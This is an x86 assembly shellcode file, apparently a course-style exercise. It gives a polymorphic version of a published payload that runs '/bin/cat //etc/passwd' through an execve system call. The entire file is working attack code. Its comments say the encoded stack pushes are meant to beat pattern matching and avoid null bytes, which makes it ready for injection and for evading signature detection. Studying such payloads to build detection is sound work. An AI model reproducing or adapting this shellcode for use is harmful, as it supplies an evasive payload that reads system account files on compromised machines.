; Polymorphic Version of /bin/cat Shellcode from http://shell-storm.org/shellcode/files/shellcode-571.php
; Author: Nipun Jaswal

global _start
section .text

_start:
;   xor eax,eax   
    xor ecx,ecx				; Clearing out ECX

;   cdq
    mul ecx				; Clearing EAX     

;   push edx
    push eax
;   mov dword [esp-4], ecx		; Moving ECX to the TOP of the Stack
;   sub esp,4				; Stack Adjustment
    
    mov esi, 0x523e3f0a			; Actual Value - 22232425
    add esi, 0x22232425			; Adding the Value
    push esi				; Push Operation
;   push dword 0x7461632f

    inc esi				; Avoiding Null Byte
    sub esi, 0x05f80101			; Adjusting Second Value
    push esi				; Push Operation
;   push dword 0x6e69622f
    mov ebx, esp

    push ecx
    sub esi, 0x09f1eebc			; Re-Using ESI, Beating Pattern Matching
    push esi			
;   push  0x64777373

    sub esi, 0x03074444			; Re-Using ESI, Beating Pattern Matching
    push esi
;   push 0x61702f2f

    add esi, 0x02043601			; Re-Using ESI, Beating Pattern Matching
    dec esi				; Avoiding Null Byte
    push esi
;   push 0x6374652f
					; Unchanged Section
    mov ecx, esp    
    mov al, 0xb
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
